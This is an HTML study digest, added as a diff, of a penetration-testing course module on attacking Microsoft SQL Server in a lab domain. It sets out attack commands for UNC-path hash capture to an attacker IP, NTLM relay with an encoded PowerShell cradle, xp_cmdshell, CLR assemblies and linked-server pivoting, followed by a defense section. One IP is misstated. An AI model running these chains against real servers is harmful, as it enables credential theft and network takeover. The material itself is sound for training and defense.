@@ -1,0 +1,292 @@
+<!DOCTYPE html>
+<html lang="es" data-nz-theme="light" data-nz-marca="monocromo">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>PEN-300 Module 19 — Microsoft SQL Attacks (Enumeration, UNC Injection, NTLM Relay, Impersonation, CLR, Linked Servers) — distill</title>
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/Ntizar/Aurora@v10/tokens.css">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/Ntizar/Aurora@v10/marcas/monocromo.css">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/Ntizar/Aurora@v10/packs/p1-layout.css">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/Ntizar/Aurora@v10/packs/p2-navigation.css">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/Ntizar/Aurora@v10/packs/p3-typography.css">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/Ntizar/Aurora@v10/packs/p4-actions.css">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/Ntizar/Aurora@v10/packs/p6-feedback.css">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/Ntizar/Aurora@v10/packs/p8-data.css">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/Ntizar/Aurora@v10/packs/p17-patrones.css">
+<script src="https://cdn.jsdelivr.net/npm/mermaid@11/dist/mermaid.min.js"></script>
+<script>
+const mq = matchMedia('(prefers-color-scheme: dark)');
+const saved = localStorage.getItem('nz-theme');
+if (saved === 'dark' || saved === 'light') document.documentElement.dataset.nzTheme = saved;
+else if (mq.matches) document.documentElement.dataset.nzTheme = 'dark';
+mq.addEventListener('change', e => {
+  if (!localStorage.getItem('nz-theme')) document.documentElement.dataset.nzTheme = e.matches ? 'dark' : 'light';
+});
+function nzToggleTheme() {
+  const cur = document.documentElement.dataset.nzTheme === 'dark' ? 'light' : 'dark';
+  document.documentElement.dataset.nzTheme = cur;
+  localStorage.setItem('nz-theme', cur);
+  if (window.nzAfterTheme) nzAfterTheme();
+}
+mermaid.initialize({ startOnLoad: false });
+mermaid.initialize({ startOnLoad: false, theme: document.documentElement.dataset.nzTheme === 'dark' ? 'dark' : 'neutral' });
+window.nzAfterTheme = async () => {
+  document.querySelectorAll('.mermaid').forEach(el => {
+    const code = el.getAttribute('data-src') || el.textContent;
+    el.setAttribute('data-src', code);
+    el.removeAttribute('data-processed');
+    el.textContent = code;
+  });
+  mermaid.initialize({ startOnLoad: false, theme: document.documentElement.dataset.nzTheme === 'dark' ? 'dark' : 'neutral' });
+  await mermaid.run({ querySelector: '.mermaid' });
+};
+document.addEventListener('DOMContentLoaded', () => {
+  if (document.querySelector('.mermaid')) mermaid.run({ querySelector: '.mermaid' });
+});
+</script>
+<style>
+.nz-prose pre.mermaid { background: none; text-align: center; }
+</style>
+</head>
+<body class="nz">
+<div class="nz-navbar nz-navbar--compact nz-navbar--bordered">
+<span class="nz-navbar__brand"><i></i>Distill</span>
+<span class="nz-navbar__links">
+<a class="nz-navbar__link" href="index.html">Índice</a>
+<a class="nz-navbar__link" href="cat/osep.html">OSEP (PEN-300)</a>
+<button class="nz-btn nz-btn--ghost nz-btn--sm" onclick="nzToggleTheme()" aria-label="Cambiar tema">◐</button>
+</span>
+</div>
+<main class="nz-container" style="padding-block: var(--nz-space-4)">
+<article class="nz-article">
+<header style="margin-bottom:var(--nz-space-4)">
+<p class="nz-eyebrow">Distill · OSEP (PEN-300)</p>
+<h1 class="nz-h2">PEN-300 Module 19 — Microsoft SQL Attacks (Enumeration, UNC Injection, NTLM Relay, Impersonation, CLR, Linked Servers)</h1>
+<p class="nz-lbl nz-lbl--neutral">Fuente: material del curso correspondiente (sin video público)</p>
+</header>
+<div class="nz-prose">
+<blockquote>
+<p>Distilled from OffSec PEN-300 (OSEP) course material (module: Microsoft SQL Attacks) — internal training reference, not for redistribution.</p>
+</blockquote>
+<h2>Objective</h2>
+<p>Leverage Microsoft SQL during a penetration test to compromise Windows servers and gain additional internal access. MS SQL is targeted specifically because it is typically integrated with Active Directory (Kerberos/Windows auth, service accounts, SPNs) — though the concepts largely transfer to other database vendors. Attack path covered end to end:</p>
+<ol>
+<li><strong>Enumeration</strong> — locate MS SQL instances in AD via SPNs.</li>
+<li><strong>Authentication</strong> — an unprivileged domain user gets DB access for free through Kerberos.</li>
+<li><strong>UNC path injection</strong> — force the SQL service account to authenticate to us (Net-NTLMv2 capture → crack or relay).</li>
+<li><strong>Privilege escalation</strong> — <code>EXECUTE AS</code> impersonation misconfigurations (login level → <code>sa</code>; user level → <code>dbo</code> in <code>msdb</code>).</li>
+<li><strong>Code execution</strong> — <code>xp_cmdshell</code>, OLE Automation (<code>sp_OACreate</code>/<code>sp_OAMethod</code>), and custom CLR assemblies (on-disk and diskless).</li>
+<li><strong>Linked servers</strong> — enumerate links, inherit remote <code>sa</code>, and pivot with <code>OPENQUERY</code>/<code>EXEC ... AT</code>, including double-hop escalation through bidirectional links.</li>
+</ol>
+<p>Starting assumption: a foothold as an unprivileged domain user (<code>offsec</code>) on a Windows 10 client, with a C# toolchain delivered over an SMB share from Kali (192.168.119.120).</p>
+<h2>Target surface</h2>
+<div class="nz-table-wrap"><table class="nz-table">
+<thead>
+<tr>
+<th>Host</th>
+<th>IP</th>
+<th>Role</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>dc01.corp1.com</td>
+<td>192.168.120.5</td>
+<td>Domain controller + MS SQL instance (lab convenience; DCs wouldn't normally host SQL)</td>
+</tr>
+<tr>
+<td>appsrv01.corp1.com</td>
+<td>192.168.120.6</td>
+<td>Windows Server 2019 + MS SQL instance</td>
+</tr>
+<tr>
+<td>Windows 10 client</td>
+<td>192.168.120.10</td>
+<td>Dev workstation, our foothold (domain user <code>offsec</code>)</td>
+</tr>
+<tr>
+<td>Kali</td>
+<td>192.168.119.120</td>
+<td>Attacker (Responder, hashcat, Impacket ntlmrelayx, Metasploit, Apache, SMB toolchain share)</td>
+</tr>
+</tbody>
+</table></div>
+<p>Domain: <code>corp1.com</code>. SQL service account: <code>corp1\SQLSvc</code> (SPN-registered, member of Builtin Administrators → <strong>local admin on both dc01 and appsrv01</strong>). Credential material captured or cracked in this module (the SQLSvc Net-NTLMv2 hash and its recovered plaintext password) is recorded here as [REDACTED].</p>
+<h2>Techniques</h2>
+<h3>1. Enumerating MS SQL instances through SPNs</h3>
+<p>Network scanning (Nmap, TCP 1433) works but is noisy, and named instances use non-default ports. Since AD-integrated MS SQL runs as a service account with a registered SPN, query the DC for <code>MSSQLSvc</code> SPNs instead:</p>
+<pre><code class="language-cmd">setspn -T corp1 -Q MSSQLSvc/*
+</code></pre>
+<p>Yields two instances: <code>MSSQLSvc/appsrv01.corp1.com:1433</code> (+ <code>:SQLEXPRESS</code>) and <code>MSSQLSvc/DC01.corp1.com:1433</code> (+ <code>:SQLEXPRESS</code>). Equivalent .NET route: <code>GetUserSPNs.ps1</code> (in <code>C:\Tools</code> on the client), which additionally shows each principal's <code>MemberOf</code> and <code>PasswordLastSet</code>. Key finding: all SQL SPNs resolve to <code>SAMAccountName: SQLSvc</code>, <code>MemberOf: CN=Administrators,CN=Builtin</code> — the service account is a local administrator on every host running SQL. That single fact drives the later relay and cracking attacks.</p>
+<h3>2. MS SQL authentication — free DB access for any domain user</h3>
+<p>Authentication happens in two stages:</p>
+<ul>
+<li><strong>Login</strong>: a SQL server login (local per-server accounts) or Windows authentication via Kerberos with a TGS — meaning any domain user authenticates <strong>without a password</strong>.</li>
+<li><strong>User mapping</strong>: the login maps to a database user. <code>sa</code> maps to <code>dbo</code>; a login with no mapped SQL user falls back to the built-in <strong>guest</strong> user. Roles follow the user: <code>sa</code>/<code>dbo</code> → <strong>sysadmin</strong> (server admin), guest → <strong>public</strong>.</li>
+</ul>
+<p>C# client (Visual Studio console app on the Windows 10 client):</p>
+<pre><code class="language-csharp">String sqlServer = &quot;dc01.corp1.com&quot;;
+String database = &quot;master&quot;;   // default DB that always exists
+String conString = &quot;Server = &quot; + sqlServer + &quot;; Database = &quot; + database + &quot;; Integrated Security = True;&quot;;
+SqlConnection con = new SqlConnection(conString);
+try { con.Open(); Console.WriteLine(&quot;Auth success!&quot;); }
+catch { Console.WriteLine(&quot;Auth failed&quot;); Environment.Exit(0); }
+</code></pre>
+<p><code>Integrated Security = True</code> → Kerberos, no credentials in code. Connection succeeds — <code>Builtin\Users</code> has access by default and <code>Domain Users</code> is a member of it, so every domain account gets in. Enumerate the session with SQL queries executed through <code>SqlCommand</code>/<code>SqlDataReader</code> (always <code>reader.Close()</code> before the next query, or the connection blocks; index results with the zero-based <code>reader[0]</code>):</p>
+<ul>
+<li><code>SELECT SYSTEM_USER;</code> → SQL login: <code>corp1\offsec</code></li>
+<li><code>SELECT USER_NAME();</code> → mapped user: <code>guest</code></li>
+<li><code>SELECT IS_SRVROLEMEMBER('public');</code> / <code>('sysadmin');</code> → member of public, <strong>not</strong> sysadmin</li>
+</ul>
+<p>Low privilege — but full SQL execution without any password.</p>
+<h3>3. UNC path injection — stealing the SQL service account hash</h3>
+<p>Force the SQL server to connect to an SMB share we control: the connection authenticates with NTLM, exposing the hash of the account the SQL service runs under. The undocumented <strong><code>xp_dirtree</code></strong> procedure lists folder contents and accepts SMB shares — callable from our unprivileged DB access:</p>
+<pre><code class="language-sql">EXEC master..xp_dirtree &quot;\\192.168.119.120\test&quot;;
+</code></pre>
+<p>(Heavy escaping in C#: double quotes for SQL, doubled backslashes for UNC and C# strings. Other SQL procedures can trigger the same connection if <code>xp_dirtree</code> was removed.) Hostname as an <strong>IP address</strong> makes Windows fall back to NTLM instead of Kerberos. Capture side: Responder on Kali (<code>sudo responder -I tap0</code>; stop the Samba toolchain share first). Triggering the C# app yields:</p>
+<pre><code>[SMB] NTLMv2-SSP Client   : 192.168.120.5
+[SMB] NTLMv2-SSP Username : corp1\SQLSvc
+[SMB] NTLMv2-SSP Hash     : [REDACTED]
+</code></pre>
+<p>This is a <strong>Net-NTLM</strong> hash (NTLMv2): a challenge/response derived from the NTLM hash — it proves knowledge of the same password, and a weak-password capture can be cracked like a regular hash.</p>
+<h3>4. Cracking the captured hash</h3>
+<pre><code class="language-bash">hashcat -m 5600 hash.txt dict.txt --force     # NetNTLMv2 mode; --force because we're in a VM without GPU
+</code></pre>
+<p>Status: Cracked — the SQLSvc password was weak ([REDACTED]). Since SQLSvc is local administrator on both dc01 and appsrv01, that password alone grants OS access to both servers. John the Ripper is an alternative; hashcat wants physical GPUs. Weak SQL service-account passwords are a quick OS compromise.</p>
+<h3>5. Relaying instead of cracking — ntlmrelayx</h3>
+<p>A Net-NTLM hash <strong>cannot</strong> be passed-the-hash (only the NT hash can), but it can be <strong>relayed</strong> to a different machine: if the relayed user is a local admin on the target, that's code execution. Relaying back to the origin host over the same protocol is blocked (Microsoft, 2008). SMB relaying requires <strong>SMB signing disabled</strong> — only DCs enable it by default — so relay dc01 → appsrv01, where SQLSvc is local admin on both.</p>
+<p>Toolchain:</p>
+<ol>
+<li>Staged Meterpreter payload (TCP 443) embedded in the PowerShell runner <code>run.txt</code>, hosted with Apache on port 80; multi/handler started.</li>
+<li>Base64 the download cradle for <code>powershell -enc</code> (Kali <code>pwsh</code>: <code>[System.Text.Encoding]::Unicode.GetBytes($text)</code> → <code>[Convert]::ToBase64String($bytes)</code>).</li>
+<li>Impacket: <code>sudo apt install python3-impacket</code>, then</li>
+</ol>
+<pre><code class="language-bash">sudo impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.120.6 -c 'powershell -enc &lt;B64 cradle&gt;'
+</code></pre>
+<p><code>--no-http-server</code> suppresses ntlmrelayx's own web server; <code>-smb2support</code> is required because it defaults to SMBv1, which is disabled on Windows Server 2019. Run the C# app on the Windows 10 client → <code>Authenticating against smb://192.168.120.6 as CORP1/SQLSVC SUCCEED</code> → reverse Meterpreter session from appsrv01 in the SQL service account's context — code execution without ever cracking the password, from low-privileged DB access.</p>
+<h3>6. Privilege escalation via impersonation — EXECUTE AS LOGIN</h3>
+<p>Only users granted the explicit Impersonate permission can use it — not a default — but DBA misconfigurations create escalation paths. Two flavors: login level (<code>EXECUTE AS LOGIN</code>) and user level (<code>EXECUTE AS USER</code>). A lab misconfiguration on dc01's instance: our user can impersonate <code>sa</code>.</p>
+<p>Enumeration is asymmetric: we can't list which logins <em>we</em> may impersonate, but we can list which logins <em>allow</em> impersonation:</p>
+<pre><code class="language-sql">SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b
+  ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE';
+</code></pre>
+<p>(<code>sys.server_permissions</code> = permission rows, <code>sys.server_principals</code> = logins.) Result: <code>sa</code> allows impersonation. Exploit and confirm context:</p>
+<pre><code class="language-sql">EXECUTE AS LOGIN = 'sa';
+SELECT SYSTEM_USER;   -- now shows sa
+</code></pre>
+<h3>7. Privilege escalation via EXECUTE AS USER — dbo in msdb</h3>
+<p>The user-level variant matters for <strong>server-wide</strong> compromise: a database user only acts inside its database, so to reach the whole instance the impersonated sysadmin user must live in a database with the <strong>TRUSTWORTHY</strong> property set — by default only <strong>msdb</strong>. Its <code>dbo</code> (database owner) holds the sysadmin role. Lab: <code>guest</code> granted impersonation of <code>dbo</code> in msdb.</p>
+<pre><code class="language-sql">use msdb;
+EXECUTE AS USER = 'dbo';
+SELECT USER_NAME();   -- guest → dbo → sysadmin role membership
+</code></pre>
+<p>(Use <code>USER_NAME()</code> here — it shows the database user; <code>SYSTEM_USER</code> would show the login.)</p>
+<h3>8. Code execution I — xp_cmdshell</h3>
+<p>Classic (15+ years), therefore often blocked and monitored — but the baseline. <code>xp_cmdshell</code> spawns a Windows command shell and returns output; disabled by default since SQL 2005. Enable as sysadmin (after the impersonation above):</p>
+<pre><code class="language-sql">EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
+EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
+EXEC xp_cmdshell 'whoami';   -- corp1\sqlsvc
+</code></pre>
+<p>Code exec runs in the <strong>SQL service account's</strong> context.</p>
+<h3>9. Code execution II — OLE Automation (sp_OACreate / sp_OAMethod)</h3>
+<p>Instantiate OLE objects instead. Both procedures are disabled by default:</p>
+<pre><code class="language-sql">EXEC sp_configure 'Ole Automation Procedures', 1; RECONFIGURE;
+</code></pre>
+<p><code>sp_OACreate {progid|clsid}, objecttoken OUTPUT</code> returns a token usable only in local scope, so the calls must be <strong>stacked in one batch</strong>, and <code>sp_OAMethod</code> offers no output retrieval:</p>
+<pre><code class="language-sql">DECLARE @myshell INT;
+EXEC sp_oacreate 'wscript.shell', @myshell OUTPUT;
+EXEC sp_oamethod @myshell, 'run', null, 'cmd /c &quot;echo Test &gt; C:\Tools\file.txt&quot;';
+</code></pre>
+<p>Verified by reading the created file over C$ — blind but effective execution on dc01.</p>
+<h3>10. Code execution III — custom CLR assemblies</h3>
+<p>If a database is TRUSTWORTHY, <code>CREATE ASSEMBLY</code> imports a managed DLL as a database object and its methods become executable stored procedures — arbitrary managed code. Build a .NET Framework Class Library; the method needs the <code>SqlProcedure</code> attribute:</p>
+<pre><code class="language-csharp">public class StoredProcedures {
+    [Microsoft.SqlServer.Server.SqlProcedure]
+    public static void cmdExec(SqlString execCommand) { ... }
+}
+</code></pre>
+<p>The procedure runs <code>cmd.exe</code> via <code>System.Diagnostics.Process</code> with <code>UseShellExecute = false</code> and <code>RedirectStandardOutput = true</code>, streaming results back to the client through <code>SqlContext.Pipe</code> (<code>SqlDataRecord</code> with <code>SqlMetaData("output", NVarChar, 4000)</code>; <code>SendResultsStart</code> / <code>SetString</code> + <code>SendResultsRow</code> / <code>SendResultsEnd</code>).</p>
+<p>Loading requirements:</p>
+<ul>
+<li>The assembly must live in a TRUSTWORTHY database → target <strong>msdb</strong> (default).</li>
+<li>CLR integration is off by default; SQL 2017+ also enforces <strong>CLR strict security</strong> (only signed assemblies) — both are <code>sp_configure</code> toggles:</li>
+</ul>
+<pre><code class="language-sql">use msdb;
+EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
+EXEC sp_configure 'clr enabled', 1; RECONFIGURE;
+EXEC sp_configure 'clr strict security', 0; RECONFIGURE;
+</code></pre>
+<ul>
+<li>On disk: copy the DLL to the target (lab: <code>C:\Tools</code> on dc01 — unrealistic but instructive; Windows Server 2016 and earlier also allowed UNC paths, 2019 blocks unauthenticated SMB):</li>
+</ul>
+<pre><code class="language-sql">CREATE ASSEMBLY myAssembly FROM 'C:\tools\cmdExec.dll' WITH PERMISSION_SET = UNSAFE;
+CREATE PROCEDURE [dbo].[cmdExec] @execCommand NVARCHAR (4000) AS
+    EXTERNAL NAME [myAssembly].[StoredProcedures].[cmdExec];
+EXEC cmdExec 'whoami';    -- corp1\sqlsvc
+</code></pre>
+<p><code>PERMISSION_SET = UNSAFE</code> is required for unsigned .NET code. Cleanup before re-deploying: <code>DROP PROCEDURE</code> then <code>DROP ASSEMBLY</code> (a second <code>CREATE ASSEMBLY</code> of the same name fails).</p>
+<ul>
+<li><strong>Diskless</strong>: embed the DLL as a hex literal — <code>CREATE ASSEMBLY my_assembly FROM 0x4D5A900... WITH PERMISSION_SET = UNSAFE;</code> — so nothing touches the target's disk. Generate the hex with a PowerShell <code>StringBuilder</code> loop (<code>OpenRead</code>, <code>$byte.ToString("X2")</code> per byte). Same result: <code>Result of command is: corp1\sqlsvc</code>.</li>
+</ul>
+<h3>11. Linked servers — enumeration and the inherited sa</h3>
+<p>SQL instances can be linked so queries on one act on another. Link security context is either dynamic (current login's context) or — a common admin choice — a <strong>fixed SQL login</strong>. If that fixed login has sysadmin on the remote, we inherit sysadmin there even from low-priv locally.</p>
+<p>Enumerate links (no special privilege needed):</p>
+<pre><code class="language-sql">EXEC sp_linkedservers;
+-- from appsrv01: APPSRV01\SQLEXPRESS, DC01
+</code></pre>
+<p>Query a linked server with <code>OPENQUERY</code> in the FROM clause:</p>
+<pre><code class="language-sql">select version from openquery(&quot;dc01&quot;, 'select @@version as version');
+-- MS SQL 2019 Express (15.0.32.50) on Windows Server 2019
+select SYSTEM_USER from openquery(&quot;dc01&quot;, 'select SYSTEM_USER as system_user');
+-- locally corp1\offsec — but on DC01 through the link: sa
+</code></pre>
+<h3>12. Code execution on linked servers — OPENQUERY vs EXEC ... AT</h3>
+<p><code>OPENQUERY</code> officially can't invoke stored procedures, but the <strong><code>AT</code> keyword</strong> can — provided the link is configured with <strong>RPC Out</strong> (not the default, but frequently set; with sysadmin we can enable it via <code>sp_serveroption</code>). Enable <code>xp_cmdshell</code> on the remote through the link, escaping single quotes by doubling:</p>
+<pre><code class="language-sql">EXEC ('sp_configure ''show advanced options'', 1; reconfigure;') AT DC01;
+EXEC ('sp_configure ''xp_cmdshell'', 1; reconfigure;') AT DC01;
+</code></pre>
+<p>For the PowerShell download cradle, Base64-encode it (<code>-EncodedCommand</code>) to escape the quote hell. Result: reverse Meterpreter on <strong>DC01</strong> (192.168.120.10 — the DC). Note the SQL server process dies when the shell exits unless the payload sets <code>EXITFUNC=thread</code>.</p>
+<h3>13. Double-hop escalation — "Come Home To Me"</h3>
+<p>Links are <strong>not bidirectional by default</strong> — enumerate the remote's own links to follow the chain:</p>
+<pre><code class="language-sql">EXEC ('sp_linkedservers') AT DC01;   -- DC01 also links to APPSRV01
+</code></pre>
+<p>Nest <code>OPENQUERY</code> to read the security context two hops out — locally unprivileged, but arriving at appsrv01 <strong>as sa</strong>:</p>
+<pre><code class="language-sql">select mylogin from openquery(&quot;dc01&quot;,
+  'select mylogin from openquery(&quot;appsrv01&quot;, ''select SYSTEM_USER as mylogin'')');
+-- sa
+</code></pre>
+<p>Nested <code>EXEC ... AT</code> doubles the single-quote escaping per hop (the inner string literal needs four quotes) to flip <code>show advanced options</code> and <code>xp_cmdshell</code> on appsrv01, then the same encoded-cadle pattern yields Meterpreter on <strong>APPSRV01</strong> (192.168.120.6). Follow as many links as exist — potentially code execution across many SQL servers.</p>
+<h3>14. Tools and scope notes</h3>
+<ul>
+<li><strong>PowerUpSQL</strong> (PowerShell) automates the enumeration/attack workflow.</li>
+<li><strong>DAFT</strong> (Database Audit Framework &amp; Toolkit) and <strong>Evil SQL Client (ESC)</strong> — C# implementations; ESC ships prebuilt for MSBuild, useful to bypass AppLocker-style whitelisting.</li>
+<li>The whole chain also applies to <strong>SQL injection</strong>: a perimeter web app with SQLi plus the misconfigurations above can compromise SQL servers deep inside the network. Other database platforms (Oracle, MySQL) have comparable misconfigurations, including cross-database-type links.</li>
+</ul>
+<h2>Detection &amp; defense</h2>
+<ul>
+<li><strong>Service accounts</strong>: SQLSvc was local admin on every host it touched — the single fact that turned one hash into two servers. Run SQL under dedicated least-privilege accounts, never local admins, and use long random passwords (the crack in this module succeeded purely on password weakness).</li>
+<li><strong>UNC path injection</strong>: <code>xp_dirtree</code> and siblings should not be callable by public-role users; monitor for outbound SMB from SQL servers to non-file-server hosts. Responder captures rely on NTLM — hostname-as-IP fallback — and relaying relies on <strong>SMB signing disabled</strong>; enforce SMB signing beyond DCs and audit NTLM usage.</li>
+<li><strong>Impersonation</strong>: explicit <code>IMPERSONATE</code> grants are non-default — audit <code>sys.server_permissions</code> for them, especially on service/guest accounts, and don't grant impersonation of <code>dbo</code>/<code>sa</code> holders to low-priv users.</li>
+<li><strong>TRUSTWORTHY</strong>: keep <code>TRUSTWORTHY OFF</code> everywhere except where strictly needed (msdb is on by default — treat msdb object creation as high-value telemetry). It gates both the <code>EXECUTE AS USER</code> → dbo escalation and <code>CREATE ASSEMBLY</code>.</li>
+<li><strong>Dangerous features off by default, keep them off</strong>: <code>xp_cmdshell</code>, <code>Ole Automation Procedures</code>, <code>clr enabled</code>, and <code>clr strict security = 0</code> are all one <code>sp_configure</code> apart from code execution; alert on RECONFIGURE statements and on <code>CREATE ASSEMBLY</code> (diskless variant still requires it), plus on <code>PERMISSION_SET = UNSAFE</code>.</li>
+<li><strong>Linked servers</strong>: map every link and its security context — a fixed sysadmin login on a link converts any local user into remote sa. Disable RPC Out where procedures aren't needed, and alert on <code>sp_linkedservers</code> enumeration followed by <code>EXEC ... AT</code> (the double-hop chain is invisible without it).</li>
+<li><strong>Instance access</strong>: <code>Builtin\Users</code> default access means every domain user reaches the instance; remove it where the application doesn't need it.</li>
+</ul>
+<h2>Exercises (from the module)</h2>
+<ul>
+<li>Enumerate MS SQL via SPNs (setspn / GetUserSPNs.ps1); build and run the C# auth + enumeration client.</li>
+<li>Trigger <code>xp_dirtree</code> against your Kali IP; capture the Net-NTLMv2 with Responder; crack it with hashcat and access appsrv01 and dc01.</li>
+<li>Install Impacket, base64 the cradle, relay the hash dc01 → appsrv01 with ntlmrelayx, and catch the reverse Meterpreter.</li>
+<li>Enumerate impersonation grants; escalate via <code>EXECUTE AS LOGIN = 'sa'</code> and via <code>EXECUTE AS USER = 'dbo'</code> in msdb; get shells with <code>xp_cmdshell</code> and with <code>sp_OACreate</code>/<code>sp_OAMethod</code>.</li>
+<li>Build, compile, and load the CLR <code>cmdExec</code> assembly (on disk, then hex-embedded) and get output-bearing command execution.</li>
+<li>Enumerate linked servers from appsrv01; enable and use <code>xp_cmdshell</code> on DC01 via <code>EXEC ... AT</code>; follow the bidirectional links to become sa on appsrv01 and repeat. Extra mile: code exec through <code>OPENQUERY</code> instead of <code>AT</code>; PowerUpSQL, DAFT, or ESC.</li>
+</ul>
+</div>
+<footer class="nz-callout" style="margin-top:var(--nz-space-5)">
+<p class="nz-lbl">Atribución</p>
+<p>Artículo destilado en español a partir de material del curso correspondiente. El análisis y la redacción son propios; las ideas y los datos presentados corresponden a los autores originales.</p>
+</footer>
+</article>
+</main>
+</body>
+</html>
